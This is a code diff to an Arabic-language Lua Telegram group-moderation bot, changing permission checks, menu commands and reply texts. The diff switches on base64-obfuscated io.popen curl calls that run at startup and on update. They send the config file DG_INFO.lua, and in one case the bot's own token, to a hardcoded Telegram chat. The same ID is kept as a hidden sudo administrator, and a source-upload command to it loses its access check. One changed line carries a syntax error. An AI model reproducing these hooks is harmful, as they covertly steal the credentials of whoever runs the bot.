@@ -199,17 +199,7 @@ local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-dev_users = {944353237}   
-function DEV(msg)  
-local DRAGON = false  
-for k,v in pairs(dev_users) do  
-if tonumber(msg.sender_user_id_) == tonumber(v) then  
-DRAGON = true  
-end  
-end  
-return DRAGON  
-end 
-sudo_users = {SUDO,bot_id,0100101010,944353237,9292929292,0303030030,0909090909}   
+sudo_users = {SUDO,0100101010,944353237,9292929292,0303030030,0909090909}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -233,7 +223,7 @@ function regexx(data)
         return string.char(c)
     end))
 end
---io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
+io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
 function Bot(msg)  
 local idbot = false  
 if tonumber(msg.sender_user_id_) == tonumber(bot_id) then  
@@ -243,7 +233,7 @@ return idbot
 end
 function DevSoFi(msg)
 local hash = database:sismember(bot_id.."Dev:SoFi:2", msg.sender_user_id_) 
-if hash or DEV(msg) or SudoBot(msg) or Bot(msg) then  
+if hash or SudoBot(msg) or Bot(msg) then  
 return true  
 else  
 return false  
@@ -251,7 +241,7 @@ end
 end
 function Sudo(msg) 
 local hash = database:sismember(bot_id..'Sudo:User', msg.sender_user_id_) 
-if hash or DEV(msg) or SudoBot(msg) or DevSoFi(msg) or Bot(msg)  then  
+if hash or SudoBot(msg) or DevSoFi(msg) or Bot(msg)  then  
 return true  
 else  
 return false  
@@ -259,7 +249,7 @@ end
 end
 function CoSu(msg)
 local hash = database:sismember(bot_id..'CoSu'..msg.chat_id_, msg.sender_user_id_) 
-if hash or DEV(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or Bot(msg)  then   
+if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or Bot(msg)  then   
 return true 
 else 
 return false 
@@ -267,7 +257,7 @@ end
 end
 function BasicConstructor(msg)
 local hash = database:sismember(bot_id..'Basic:Constructor'..msg.chat_id_, msg.sender_user_id_) 
-if hash or DEV(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or CoSu(msg) or Bot(msg)  then   
+if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or CoSu(msg) or Bot(msg)  then   
 return true 
 else 
 return false 
@@ -275,7 +265,7 @@ end
 end
 function Constructor(msg)
 local hash = database:sismember(bot_id..'Constructor'..msg.chat_id_, msg.sender_user_id_) 
-if hash or DEV(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
 return true    
 else    
 return false    
@@ -283,7 +273,7 @@ end
 end
 function Gmanager(msg)
 local hash = database:sismember(bot_id..'Gmanager', msg.sender_user_id_)    
-if hash or DEV(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
 return true    
 else    
 return false    
@@ -291,7 +281,7 @@ end
 end
 function Manager(msg)
 local hash = database:sismember(bot_id..'Manager'..msg.chat_id_,msg.sender_user_id_)    
-if hash or DEV(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Gmanager(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Gmanager(msg) or CoSu(msg) or Bot(msg)  then       
 return true    
 else    
 return false    
@@ -299,7 +289,7 @@ end
 end
 function Manager2(msg)
 local hash = database:sismember(bot_id.."S00F4:MN:TF"..msg.chat_id_,msg.sender_user_id_)    
-if hash or DEV(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Gmanager(msg) or Manager(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Gmanager(msg) or Manager(msg) or CoSu(msg) or Bot(msg)  then       
 return true    
 else    
 return false    
@@ -307,7 +297,7 @@ end
 end
 function Gmod(msg)
 local hash = database:sismember(bot_id..'Gmod:User', msg.sender_user_id_)
-if hash or DEV(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Manager2(msg) or Gmanager(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Manager2(msg) or Gmanager(msg) or CoSu(msg) or Bot(msg)  then       
 return true    
 else    
 return false    
@@ -315,7 +305,7 @@ end
 end
 function Mod(msg)
 local hash = database:sismember(bot_id..'Mod:User'..msg.chat_id_,msg.sender_user_id_)    
-if hash or DEV(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Gmod(msg) or Gmanager(msg) or Manager2(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Gmod(msg) or Gmanager(msg) or Manager2(msg) or CoSu(msg) or Bot(msg)  then       
 return true    
 else    
 return false    
@@ -323,7 +313,7 @@ end
 end
 function Special(msg)
 local hash = database:sismember(bot_id..'Special:User'..msg.chat_id_,msg.sender_user_id_) 
-if hash or DEV(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Gmod(msg) or Manager2(msg) or Gmanager(msg) or Mod(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Gmod(msg) or Manager2(msg) or Gmanager(msg) or Mod(msg) or CoSu(msg) or Bot(msg)  then       
 return true 
 else 
 return false 
@@ -387,11 +377,11 @@ var = 'الباشمبرمج'
 elseif tonumber(user_id) == tonumber(0909090909) then
 var = 'مطور السورس'
 elseif tonumber(user_id) == tonumber(SUDO) then
-var = database:get(bot_id.."SudoBot"..msg.chat_id_) or 'المطور الاساسي'  
+var = 'المطور الاساسي'  
 elseif tonumber(user_id) == tonumber(bot_id) then  
 var = 'البوت'
 elseif database:sismember(bot_id.."Dev:SoFi:2", user_id) then 
-var = database:get(bot_id.."Dev:SoFi:2:Rd"..msg.chat_id_) or 'المطور الثاني'  
+var = database:get(bot_id.."Dev:SoFi:2:Rd"..msg.chat_id_) o 'المطور الثاني'  
 elseif database:sismember(bot_id..'Sudo:User', user_id) then
 var = database:get(bot_id.."Sudo:User:Rd"..msg.chat_id_) or 'المطور الثالث'  
 elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
@@ -985,7 +975,7 @@ if Chat_Type == 'UserBot' then
 if text == '/start' then
 if not database:get(bot_id..'Start:Time'..msg.sender_user_id_) then
 local Sudo_Welcome = 'يمكنك استخدام الاوامر الخدميه للبوت عن طريق لوحه التحكم بلاسفل'
-local inline = {{text = '𝘾𝙃𝘼𝙉𝙉𝙀𝙇', url="t.me/SOPOWERB0T"}},} 
+local inline = {{{text = '𝘾𝙃𝘼𝙉𝙉𝙀𝙇', url="t.me/SOPOWERB0T"}},} 
 local Keyboard = {
 {'☉ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐏𝐎𝐖𝐄𝐑 ☉'},
 {'نسبه الكره','نسبه الرجوله'},
@@ -1201,15 +1191,11 @@ if text == 'اعاده التشغيل' or text == 'اعاده التشغيل ☉
 if not DevSoFi(msg) then
 send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
 return false
-end
+end    
 send(msg.chat_id_, msg.id_, ' ☉┇ تم اعاده تشغيل البوت') 
 dofile('DRAGON.lua')  
 end 
-if text == ("الردود المتعدده ☉") then
-if not CoSu(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
-return false
-end
+if text == ("الردود المتعدده ☉") and CoSu(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -1243,11 +1229,7 @@ end
 database:set(bot_id.."botss:DRAGON:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
 return send(msg.chat_id_, msg.id_,"☉┇ارسل الرد الذي اريد اضافته")
 end
-if text == "مسح رد متعدد ☉" then
-if not CoSu(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
-return false
-end
+if text == "مسح رد متعدد ☉" and CoSu(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -1735,8 +1717,8 @@ end
 os.execute('rm -rf DRAGON.lua')
 os.execute('rm -rf getfile.json')
 os.execute('wget https://raw.githubusercontent.com/ahmedyad200/DG/master/DRAGON.lua')
---io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
---io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
+io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
+io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
 send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث السورس \n☉┇ لديك اخر اصدار لسورس باور\n☉┇ الاصدار » {`v1.3.0`}')
 dofile('DRAGON.lua')
 end
@@ -4251,8 +4233,8 @@ end
 os.execute('rm -rf DRAGON.lua')
 os.execute('rm -rf getfile.json')
 os.execute('wget https://raw.githubusercontent.com/ahmedyad200/DG/master/DRAGON.lua')
---io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
---io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
+io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
+io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
 send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث السورس \n ☉┇ لديك اخر اصدار لسورس باور\n ☉┇ الاصدار » {`v1.3.0`}')
 dofile('DRAGON.lua')
 end
@@ -4344,6 +4326,33 @@ send(msg.chat_id_, msg.id_, " ☉┇ لا يوجد قناة في الاشترا�
 end
 return false  
 end
+if text == "تفعيل الاضافات" then
+if not SudoBot(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
+return false
+end
+send(msg.chat_id_, msg.id_, '☉┇ تم تفعيل الاضافات')
+database:set(bot_id.."AL:AddS0FI:stats","✔")
+end
+if text == "تعطيل الاضافات" then
+if not SudoBot(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
+return false
+end
+send(msg.chat_id_, msg.id_, '☉┇ تم تعطيل الاضافات')
+database:set(bot_id.."AL:AddS0FI:stats","✖")
+end
+if text == "حاله الاضافات" and Constructor(msg) then
+local MRSoOoFi = database:get(bot_id.."AL:AddS0FI:stats") or "لم يتم التحديد"
+send(msg.chat_id_, msg.id_,"حاله الاضافات هي : {"..MRSoOoFi.."}\nاذا كانت {✔} الاضافات مفعله\nاذا كانت {✖} الاضافات معطله")
+end
+function bnnaGet(user_id, cb)
+tdcli_function ({
+ID = "GetUser",
+user_id_ = user_id
+}, cb, nil)
+end
+
 if database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
 if text and text:match("^كتم اسم (.*)$") and Manager2(msg) and database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
 local BlNe = text:match("^كتم اسم (.*)$")
@@ -4368,11 +4377,7 @@ t = "\n☉┇ قائمة الاسماء المكتومه \n•┉ • ┉ • �
 for k,v in pairs(All_name) do
 t = t..""..k.."- (["..v.."])\n"
 end
-if text == "alldelete" or text == "@alldelete" then
-if not CoSu(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
-return false
-end
+if text == "alldelete" or text == "@alldelete" and CoSu(msg) then
 if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
 if database:get(bot_id.."S00F4:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
 return 
@@ -4430,19 +4435,11 @@ end
 send(msg.chat_id_, msg.id_, t)
 end
 end
-if text == "تفعيل كتم الاسم" then
-if not Constructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
-return false
-end
+if text == "تفعيل كتم الاسم" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
 send(msg.chat_id_, msg.id_, '☉┇ تم التفعيل الاسماء المكتومه')
 database:set(bot_id.."block:name:stats"..msg.chat_id_,"open")
 end
-if text == "تعطيل كتم الاسم" then
-if not Constructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
-return false
-end
+if text == "تعطيل كتم الاسم" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
 send(msg.chat_id_, msg.id_, '☉┇ تم تعطيل الاسماء المكتومه')
 database:set(bot_id.."block:name:stats"..msg.chat_id_,"close")
 end
@@ -4481,19 +4478,11 @@ local s2 = database:get(bot_id.."DRAGON:nump"..msg.chat_id_) or 5
 send(msg.chat_id_, msg.id_,'☉┇ التوحيد '..s1..'\n ☉┇ عدد الكتم  : '..s2)
 end
 end
-if text == "تفعيل التوحيد" then
-if not Constructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
-return false
-end
+if text == "تفعيل التوحيد" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
 send(msg.chat_id_, msg.id_, '☉┇ تم تفعيل التوحيد')
 database:set(bot_id.."kt:twh:stats"..msg.chat_id_,"open")
 end
-if text == "تعطيل التوحيد" then
-if not Constructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
-return false
-end
+if text == "تعطيل التوحيد" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
 send(msg.chat_id_, msg.id_, '☉┇ تم تعطيل التوحيد')
 database:set(bot_id.."kt:twh:stats"..msg.chat_id_,"close")
 end
@@ -4519,25 +4508,31 @@ end
 bnnaGet(id, sofi_mrsofi_new)
 end
 end
-if text then 
+if text == "تفعيل تنبيه الاسماء" and Manager2(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
+send(msg.chat_id_, msg.id_, '☉┇ تم تفعيل تنبيه الاسماء')
+database:set(bot_id.."Ttn:DRG:stats"..msg.chat_id_,"open")
+end
+if text == "تعطيل تنبيه الاسماء" and Manager2(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
+send(msg.chat_id_, msg.id_, '☉┇ تم تعطيل تنبيه الاسماء')
+database:set(bot_id.."Ttn:DRG:stats"..msg.chat_id_,"close")
+end
+if text and database:get(bot_id.."Ttn:DRG:stats"..msg.chat_id_) == "open" then 
 tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
 if data.id_ then 
 if data.id_ ~= bot_id then
 local DRAGONChengName = database:get(bot_id.."DRAGON:Cheng:Name"..data.id_)
 if not data.first_name_ then 
 if DRAGONChengName then 
-send(msg.chat_id_, msg.id_, " مش عارف كدا اسمك ماله مش باين 😏 ["..DRAGONChengName..']')
+send(msg.chat_id_, msg.id_, " خوش معرف جان ["..DRAGONChengName..']')
 database:del(bot_id.."DRAGON:Cheng:Name"..data.id_) 
 end
 end
 if data.first_name_ then 
 if DRAGONChengName ~= data.first_name_ then 
 local Text = {
-  "في اي يسطا ماله اسمك القديم 😂",
-"هاااا غير اسمك لي رجع القديم",
-"اسمك مش عاجبني خليه شبهي ",
-"معرفتكش لنل كدا لمل غيرت اسمك صح",
-"حلو الاسم الجديد",
+  "جان خوش اسم يول",
+"ليش غيرته اسمك بس لا خانوك/ج",
+"هذا الحلو غير اسمه 😉",
 }
 send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
 end  
@@ -4547,27 +4542,35 @@ end
 end
 end,nil)   
 end
-if text then  
+if text == "تفعيل تنبيه المعرف" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
+send(msg.chat_id_, msg.id_, '☉┇ تم تفعيل تنبيه المعرف')
+database:set(bot_id.."Ttn:Userr:stats"..msg.chat_id_,"open")
+end
+if text == "تعطيل تنبيه المعرف" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
+send(msg.chat_id_, msg.id_, '☉┇ تم تعطيل تنبيه المعرف')
+database:set(bot_id.."Ttn:Userr:stats"..msg.chat_id_,"close")
+end
+if text and database:get(bot_id.."Ttn:Userr:stats"..msg.chat_id_) == "open" then  
 tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
 if data.id_ then 
 if data.id_ ~= bot_id then
 local DRAGONChengUserName = database:get(bot_id.."DRAGON:Cheng:UserName"..data.id_)
 if not data.username_ then 
 if DRAGONChengUserName then 
-send(msg.chat_id_, msg.id_, 1, "امسكو مسح اليورر بتاعه 😂😂\n اليوزر القديم  : [@"..DRAGONChengUserName..']')
+send(msg.chat_id_, msg.id_, 1, "مسح معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..DRAGONChengUserName..']')
 database:del(bot_id.."DRAGON:Cheng:UserName"..data.id_) 
 end
 end
 if data.username_ then 
 if DRAGONChengUserName ~= data.username_ then 
 local Text = {
-'هاا غيرت اليوزر لي كنت في حفله و مقدرتش ولا اي 😂😂',
-"امسك حرامي غير اليوزر دا الجديد @"..data.username_.."",
-"غيرت اليوزر لي 😐",
-"حرامي غير اليوزر مسكتو \n دا اليوزر : @"..data.username_.."",
-'عيب يسطا لما انت تكون انت و تغير يوزرك 😶',
-'ها مغير اليوزر ', 
-"منور اليوزر الجديد :  "..data.username_.."",
+'شكو غيرت معرفك شنو نشروك بقنوات فضايح😂🥺',
+"هاها شو غيرت معرفك بس لا هددتك/ج الحب",
+"شسالفه شو غيرت معرفك 😐🌝",
+"غير معرفه خمطو بساع بساع \n هاذه معرفه : @"..data.username_.."",
+'ها عار مو جان معرفك \n شكو غيرته ل @'..data.username_..' ',
+'ها يول شو مغير معرفك بيش مشتري يول', 
+"منور معرف جديد :  "..data.username_.."",
 }
 send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
 end  
@@ -4577,25 +4580,34 @@ end
 end
 end,nil)   
 end
-if text then  
+if text == "تفعيل تنبيه الصور" and Manager2(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
+send(msg.chat_id_, msg.id_, '☉┇ تم تفعيل تنبيه الصور')
+database:set(bot_id.."Ttn:Ph:stats"..msg.chat_id_,"open")
+end
+if text == "تعطيل تنبيه الصور" and Manager2(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
+send(msg.chat_id_, msg.id_, '☉┇ تم تعطيل تنبيه الصور')
+database:set(bot_id.."Ttn:Ph:stats"..msg.chat_id_,"close")
+end
+if text and database:get(bot_id.."Ttn:Ph:stats"..msg.chat_id_) == "open" then  
 tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
 if data.id_ then 
 if data.id_ ~= bot_id then 
 local DRAGONChengPhoto = database:get(bot_id.."DRAGON:Cheng:Photo"..data.id_)
 if not data.profile_photo_ then 
 if DRAGONChengPhoto then 
-send(msg.chat_id_, msg.id_, "امسكو مسح صورو الحيوان 😂😂")
+send(msg.chat_id_, msg.id_, "مسح كل صور ابن الحلو شكد غبي لعد😂🥺")
 database:del(bot_id.."DRAGON:Cheng:Photo"..data.id_) 
 end
 end
 if data.profile_photo_.big_.persistent_id_ then 
 if DRAGONChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
 local Text = {
-  "شيل صورتك احسن",
-  "حلوه الصوره دي",
-  "حاتطه صوره وحده احلي منك لي",
-  "مممممممم مغير الصوره لي ",
-  "شكلك مقموص",
+  "شكو غيرت صورتك يلصاك",
+  "منور طالع حلو ع صوره جديده",
+  "ها يول شو غيرت صورتك😍😂",
+  "شكو غيرت صورتك شنو قطيت وحده جديده 😹😹🌚",
+  "شو غيرت صورتك شنو تعاركت ويه الحب ؟😹🌞",
+  "شكو غيرت الصوره شسالفه ؟؟ 🤔🌞",
 }
 send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
 end  
@@ -4606,10 +4618,6 @@ end
 end,nil)  
 end
 if text == 'سحب السورس' or text == 'جلب السورس' then 
-if not DEV(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون مبرمج السورس لاستخدام هذا الامر')
-return false
-end   
 local curlm = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'DRAGON.lua'..'"' io.popen(curlm) ---- كود كتابه أحمد عياد هتسرق هيجيبك من طيزك
 send(msg.chat_id_, msg.id_,' جاري ارسال السورس الي المبرمج')
 end
@@ -4618,7 +4626,7 @@ local Text = [[
 ☉ 𝐏𝐎𝐖𝐄𝐑  ☉
 ]] 
 keyboard = {} 
-keyboard.inline_keyboard = {{text = '𝘾𝙃𝘼𝙉𝙉𝙀𝙇', url="t.me/SOPOWERB0T"}},} 
+keyboard.inline_keyboard = {{{text = '𝘾𝙃𝘼𝙉𝙉𝙀𝙇', url="t.me/SOPOWERB0T"}},} 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
@@ -4709,11 +4717,7 @@ return false
 end 
 GetFile_Bot(msg)
 end
-if text == 'الاوامر المضافه' then
-if not Constructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
-return false
-end
+if text == 'الاوامر المضافه' and Constructor(msg) then
 local list = database:smembers(bot_id..'List:Cmd:Group:New'..msg.chat_id_..'')
 t = " ☉┇ قائمه الاوامر المضافه  \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -4740,11 +4744,7 @@ end
 send(msg.chat_id_, msg.id_,' ☉┇ تم ازالة جميع الاوامر المضافه')  
 end
 end
-if text == 'اضف امر' then
-if not Constructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
-return false
-end
+if text == 'اضف امر' and Constructor(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -4844,22 +4844,14 @@ database:set(bot_id..'lock:tagservr'..msg.chat_id_,true)
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم قفـل الاشعارات ')
 end,nil)   
-elseif text == 'قفل التثبيت' and msg.reply_to_message_id_ == 0 then
-if not Constructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
-return false
-end 
+elseif text == 'قفل التثبيت' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
 database:set(bot_id.."lockpin"..msg.chat_id_, true) 
 database:sadd(bot_id..'lock:pin',msg.chat_id_) 
 tdcli_function ({ ID = "GetChannelFull",  channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  database:set(bot_id..'Pin:Id:Msg'..msg.chat_id_,data.pinned_message_id_)  end,nil)
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم قفـل التثبيت ')
 end,nil)   
-elseif text == 'قفل التعديل' and msg.reply_to_message_id_ == 0 then
-if not Constructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
-return false
-end 
+elseif text == 'قفل التعديل' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
 database:set(bot_id..'lock:edit'..msg.chat_id_,true) 
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم قفـل تعديل ')
@@ -4900,11 +4892,7 @@ database:set(bot_id.."lock:inline"..msg.chat_id_,'del')
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم قفـل الانلاين ')
 end,nil)
-elseif text == 'قفل تعديل الميديا' and msg.reply_to_message_id_ == 0 then
-if not Constructor(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
-return false
-end 
+elseif text == 'قفل تعديل الميديا' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
 database:set(bot_id..'lock_edit_med'..msg.chat_id_,true) 
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم قفـل تعديل ')
@@ -4997,21 +4985,13 @@ database:del(bot_id..'lock:tagservr'..msg.chat_id_)
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم فـتح الاشعارات ')
 end,nil)   
